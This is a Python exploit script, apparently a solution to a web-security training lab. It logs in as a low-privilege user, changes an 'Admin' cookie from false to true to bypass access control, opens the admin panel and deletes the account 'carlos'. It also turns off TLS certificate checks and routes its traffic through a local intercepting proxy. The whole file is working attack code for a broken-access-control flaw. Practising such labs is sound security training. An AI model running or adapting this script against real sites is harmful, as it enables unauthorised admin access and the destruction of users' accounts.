import requests
import sys
import urllib3
import re
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http' : 'http://127.0.0.1:8080' , 'https' : 'http://127.0.0.1:8080'}

def get_cookies(url):
    uri = "/login"
    r = requests.get(url + uri, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, "html.parser")
    csrf_token = soup.find("input")["value"]
    session_cookie = {'session': r.cookies.get_dict()['session']}
    params = {'csrf' : csrf_token , 'username' : 'wiener' , 'password' : 'peter'}
    r = requests.post(url + uri, cookies=session_cookie, data=params, allow_redirects=False, verify=False, proxies=proxies)
    return(r.cookies.get_dict())


def delete_user(url, cookies_dict):
    uri = "/admin"
    cookies = cookies_dict
    print("[+] Cookies acquired... {0}".format(cookies))
    cookies["Admin"] = "true"
    print("[+] Changing from 'false' to 'true... {0}".format(cookies))
    r = requests.get(url + uri, cookies=cookies, verify=False, proxies=proxies)
    print("[+] Ok, let's try!")
    if "Admin panel" in r.text:
        uri = "/admin/delete?username=carlos"
        r = requests.get(url + uri, cookies=cookies, verify=False, proxies=proxies)
        if "User deleted successfully!" in r.text:
            return True
    else:
        return False 


def main():
    if len(sys.argv) != 2:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)
    
    url = sys.argv[1].strip()
    print("[+] Testing an \"Access Control Vulnerability\" that let unauthorized users to access an admin panel and delete users.")
    print("[+] The exploit relies on changing the value of a cookie value ('Admin') from False to True.")
    print("[+] That change let unauthorized users to act as admins.\n")

    print("[+] Getting everything ready...")
    cookies_dict = get_cookies(url)
    if not delete_user(url, cookies_dict):
        print("[-] Ooopsie, something went wrong!")
        sys.exit(-1)
    print("[+] User 'carlos' deleted successfully!")

if __name__ == "__main__":
    main()